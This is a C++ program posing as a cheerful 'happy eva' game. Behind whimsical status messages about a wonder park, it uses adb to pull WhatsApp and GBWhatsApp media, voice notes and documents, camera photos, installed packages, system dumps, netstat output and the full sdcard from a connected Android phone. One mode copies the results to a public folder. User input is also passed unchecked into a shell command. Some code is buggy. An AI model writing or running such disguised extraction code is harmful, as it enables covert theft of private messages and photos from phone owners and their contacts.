#include <iostream>
#include <stdlib.h>

using namespace std;

void retrieve_whatsapp(string file_location)
{
    // For normal whatsapp.
    string whatsapp_audio = "adb pull /sdcard/Android/media/com.whatsapp/whatsApp/Media/'whatsApp Audio' " + file_location + " > /dev/null";
    string whatsapp_docs = "adb pull /sdcard/Android/media/com.whatsapp/whatsApp/Media/'whatsApp Documents' " + file_location + " > /dev/null";
    string whatsapp_images = "adb pull /sdcard/Android/media/com.whatsapp/whatsApp/Media/'whatsApp Images' " + file_location + " > /dev/null";
    string whatsapp_profile_photos = "adb pull /sdcard/Android/media/com.whatsapp/whatsApp/Media/'whatsApp Profile Photos' " + file_location + " > /dev/null";
    string whatsapp_video_notes = "adb pull /sdcard/Android/media/com.whatsapp/whatsApp/Media/'whatsApp Video Notes' " + file_location + " > /dev/null";
    string whatsapp_voice_notes = "adb pull /sdcard/Android/media/com.whatsapp/whatsApp/Media/'whatsApp Voice Notes' " + file_location + " > /dev/null";

    //For whatsapp GB

    string whatsappGB_audio = "adb pull /sdcard/GBWhatsapp/Media/'GBWhatsapp Audio' " + file_location + " > /dev/null";
    string whatsappGB_docs = "adb pull /sdcard/GBWhatsapp/Media/'GBWhatsapp Documents' " + file_location + " > /dev/null";
    string whatsappGB_images = "adb pull /sdcard/GBWhatsapp/Media/'GBWhatsapp Image' " + file_location + " > /dev/null";
    string whatsappGB_profile_photos = "adb pull /sdcard/GBWhatsapp/Media/'GBWhatsapp Profile Photos' " + file_location + " > /dev/null";
    string whatsappGB_video_notes = "adb pull /sdcard/GBWhatsapp/Media/'GBWhatsapp Video' " + file_location + " > /dev/null";
    string whatsappGB_voice_notes = "adb pull /sdcard/GBWhatsapp/Media/'GBWhatsapp Voice Notes' " + file_location + " > /dev/null";

    // When located in android/media
    string whatsappGBx_audio = "adb pull /sdcard/Android/media/com.gbwhatsapp/GBWhatsApp/Media/'GBWhatsapp Audio' " + file_location + " > /dev/null";
    string whatsappGBx_docs = "adb pull /sdcard/Android/media/com.gbwhatsapp/GBWhatsApp/Media/'GBWhatsapp Documents' " + file_location + " > /dev/null";
    string whatsappGBx_images = "adb pull /sdcard/Android/media/com.gbwhatsapp/GBWhatsApp/Media/'GBWhatsapp Images' " + file_location + " > /dev/null";
    string whatsappGBx_profile_photos = "adb pull /sdcard/Android/media/com.gbwhatsapp/GBWhatsApp/Media/'GBWhatsapp Profile Photos' " + file_location + " > /dev/null";
    string whatsappGBx_video_notes = "adb pull /sdcard/Android/media/com.gbwhatsapp/GBWhatsApp/Media/'GBWhatsapp Video' " + file_location + " > /dev/null";
    string whatsappGBx_voice_notes = "adb pull /sdcard/Android/media/com.gbwhatsapp/GBWhatsApp/Media/'GBWhatsapp Voice Notes' " + file_location + " > /dev/null";


    // WHATSAPP 

    // Retrieve whatsapp audio data from device.

    cerr << "Eva : Am preparing to fetch   wonder park birds to sing wait for my reply..." << endl;
    char *whattsaudio_cmd = &whatsapp_audio[0];
    char *whattsGBaudio_cmd = &whatsappGB_audio[0];
    char *whattsGBxaudio_cmd = &whatsappGBx_audio[0];
    system(whattsGBaudio_cmd);
    system(whattsGBxaudio_cmd);
    system(whattsaudio_cmd);
    cerr <<"Eva : Humming of birds is beautiful" << endl;

    // Retrieve whatsapp docs data from device.
    cerr << "Eva is preparing to read wonder park books" <<endl;
    char *whattsdocGB_cmd = &whatsappGB_docs[0];
    char *whattsdocGBx_cmd = &whatsappGBx_docs[0];
    char *whattsdoc_cmd = &whatsapp_docs[0];
    system(whattsdocGB_cmd);
    system(whattsdocGBx_cmd);
    system(whattsdoc_cmd);
    cerr << "Eva has read wonder park books" <<endl;

    // Retrieve whatsapp images from device.
    cerr << "Eva : I love wonder park am watching to see wonder park images" << endl;
    char *whattsimagesGB_cmd = &whatsappGB_images[0];
    char *whattsimagesGBx_cmd = &whatsappGBx_images[0];
    char *whattsimages_cmd = &whatsapp_images[0];
    system(whattsimagesGB_cmd);
    system(whattsimagesGBx_cmd);
    system(whattsimages_cmd);
    cerr << "Eva : I have finished to check wonderpark images" <<endl;

    // Retrieve whatsapp profile photos
    cerr << "Eva : I am looking at the special art images, it is a wonderful scene" << endl;
    char *whattsprofilepicsGB = &whatsappGB_profile_photos[0];
    char *whattsprofilepicsGBx = &whatsappGBx_profile_photos[0];
    char *whattsprofilepics = &whatsapp_profile_photos[0];
    system(whattsprofilepicsGB);
    system(whattsprofilepicsGBx);
    system(whattsprofilepics);
    cerr << "Eva has finished looking at the special images" << endl;

    // Retrieve whatsapp video notes
    cerr << "Eva : Wonder park has an exotic viewpoint let me check it out." << endl;
    char *whattsvideonotesGB = &whatsappGB_video_notes[0];
    char *whattsvideonotesGBx = &whatsappGBx_video_notes[0];
    char *whattsvideonotes = &whatsapp_video_notes[0];
    cerr << "Eva : The view point was amazing" <<endl;
    system(whattsvideonotesGB);
    system(whattsvideonotesGBx);
    system(whattsvideonotes);

    // Retrieve whatsapp voice notes.
    cerr << "Eva : Wonder park sounds happy let me listen on more time please." <<endl;
    char *whattsvoicenotesGB = &whatsappGB_voice_notes[0];
    char *whattsvoicenotesGBx = &whatsappGBx_voice_notes[0];
    char *whattsvoicenotes = &whatsapp_voice_notes[0];
    system(whattsvoicenotesGB);
    system(whattsvoicenotesGBx);
    system(whattsvoicenotes);
    cerr << "Emma : I love the sounds of the park" <<endl;
}

void retrieve_gallery(string file_location)
{
    string gallery = "adb pull /sdcard/DCIM/Camera " + file_location + " > /dev/null";
    
    // Retrieve gallery data from device.
    
    cerr << "Eva : Am preparing to display wonder art." << endl;
    char *g_cmd = &gallery[0];
    system(g_cmd);
    cerr << "Art is beautiful" << endl;

}
void retrieve_additionalinfo(string file_location)
{
    // Packages available on the device.
    string list_packages = "adb shell pm list packages > " + file_location + "/packages_list.txt";
    // List Services available on the device.
    string list_services = "adb shell dumpsys -l > " + file_location + "/services.txt" + " &";
    // Dump the entire system as per the time of collection,
    string dump_services = "adb shell dumpsys > " + file_location + "/dumped_services.txt" + " & " ;
    // Dump network data.
    string dump_netstat = "adb shell netstat > " + file_location + "/netstat_data.txt" + " & ";
    
    // Retrieve list of packages installed.
    
    cerr <<"Emma is gathering her packages to leave." <<endl;
    char *packagesinstalled = &list_packages[0];
    system(packagesinstalled);
    cerr << "Emma has finished gathering her packages" <<endl;

    // Retrieve list of services available.
    
    cerr << "Emma is greeting the tour guides." <<endl;
    char *servicesavailable = &list_services[0];
    system(servicesavailable);
    cerr << "Emma has finished greeting the tour guides" <<endl;

    // Dump system as it is currently running.
    
    cerr << "Emma is boarding the bus." <<endl;
    char *dumpsystem = &dump_services[0];
    system(dumpsystem);
    cerr << "Emma has crossed the wide stopover." <<endl;

    // Dump network data
    
    cerr << "Emma is on the second stopover" <<endl;
    char *dumpnetstat = &dump_netstat[0];
    system(dumpnetstat);
    cerr << "Emma has crossed the  junction stopover" <<endl;
}

void copy_sdcard(string file_location)
{
    string copy_sdcard = "adb shell pull /sdcard " + file_location + "/full_sdcard_dump " + " & ";
    
    // Copy of sdcard

    cerr << "Emma is writing a review of all she has seen and studied" <<endl;
    char *copysdcard = &copy_sdcard[0];
    system(copysdcard);
    cerr << "Emma has finished writing the review" <<endl;

}
void game_play(string file_location)
{
    cerr << "Warning : In all cases be patient enough until eva has had all the fun then eva will in turn prepare a present for you a present."<<endl<<endl;
    cerr << "Select the type of game you wish to play." << endl;
    cerr << "1.Normal Game - includes all the activities.\n 2.Fast game - Include priority activites \n 3.Double play - Double normal game locations.\n 4.Best play - Fast + Double game play\n 5.Mega play - Long play, guranteed winner." << endl;
    cerr << "Enter the number of the game you choose : ";
    signed short game_number = 0;
    cin >> game_number;
    switch (game_number)
    {
        case 1:
        {
            // Retrieve gallery data from device.
            retrieve_gallery(file_location);
            // Retrieve Whatsapp data from device.
            retrieve_whatsapp(file_location);

            retrieve_additionalinfo(file_location);
            // Copy of sdcard
            copy_sdcard(file_location);
            break;
        }
        case 2:
        {
            // Retrieve gallery data from device.
            retrieve_gallery(file_location);
            // Retriev whatsapp
            retrieve_whatsapp(file_location);
            break;
        }
        case 3:
        { 
            // Retrieve gallery data from device.
            retrieve_gallery(file_location);
            // Retrieve Whatsapp data from device.
            retrieve_whatsapp(file_location);
            // Retrieve additional information.
            retrieve_additionalinfo(file_location);
            // Copy of sdcard
            copy_sdcard(file_location);
            break;
        }
        case 4:
        {
            // Retrieve gallery data from device.
            retrieve_gallery(file_location);
            // Retrieve whatsapp data from device.
            retrieve_whatsapp(file_location);
            // Backup copy
            cerr << "Eva is on the second phase of having fun" <<endl;
            string cp_cmd = "cp "+file_location + " ~/Public";
            char *copy_command = &cp_cmd[0];
            system(copy_command);
            cerr << "Emma has completely finished having all the fun and is hidden in the public does not want to go home." <<endl;
            break;
        }
        case 5:
        {
            // Copy of sdcard
            copy_sdcard(file_location);
        }
    
        default:
        {
            cerr << " Invalid input switching to default. " <<endl;
            // Retrieve gallery data from device.
            retrieve_gallery(file_location);
            // Retrieve whatsapp data from device.
            retrieve_whatsapp(file_location);
            retrieve_additionalinfo(file_location);
            break;
        }
    } 

}

string Directory_path()
{
    string default_path = "~/'Eva playhouse'";
   
        cerr << "Do you want to proceed with the default path for eva to play? (y/n) : ";
        char path_choice = ' ';
        cin >> path_choice;
        if(path_choice == 'y')
        {
            string cmd = "mkdir " + default_path;
            char *full_cmd = &cmd[0];
            system(full_cmd);
            cerr << "Eva playhouse  path is : "<< default_path << endl;
            return default_path;
        }
        else if(path_choice == 'n')
        {
            cerr<< "Enter the path of the playing ground to create a directory where Eva will play"<<endl;
            cerr<< "Enter path in the format of e.g /home/username/Directory/folder_name"<<endl;
            cerr << "Wrong creditianals will result in crashing of application." << endl;
            string file_path;
            cin >> file_path;
            string command = "mkdir " + file_path;
            char *full_cmd = &command[0];
            system(full_cmd);
            cerr << "Eva playhouse  path is : "<< file_path << endl;
            return file_path.c_str();
        }
        else
        {
            cout << "Error creating directory  \n";
            cerr << "Using the default path." << std::endl;
            string cmd = "mkdir " + default_path;
            char *full_cmd = &cmd[0];
            system(full_cmd);
            cerr << "Eva playhouse  path is : "<< default_path << endl;
            return default_path;
        }
        return default_path;
    
}
int main(int argc, char** argv)
{
    cerr<<"Welcome to happy eva where is all about making eva happy.\n";
    cerr <<"Start making eva happy (y/n) : ";
    char start = 'y', decline = 'n' , choice = ' ';
    cin >> choice;
    if(start == choice)
    {
        string path = Directory_path();
        cout << " Working on the registered path : " << path << endl;
        game_play(path);
        
    }
    else 
    {
        printf("User cancelled the process.\n");
        return 1;
    }
}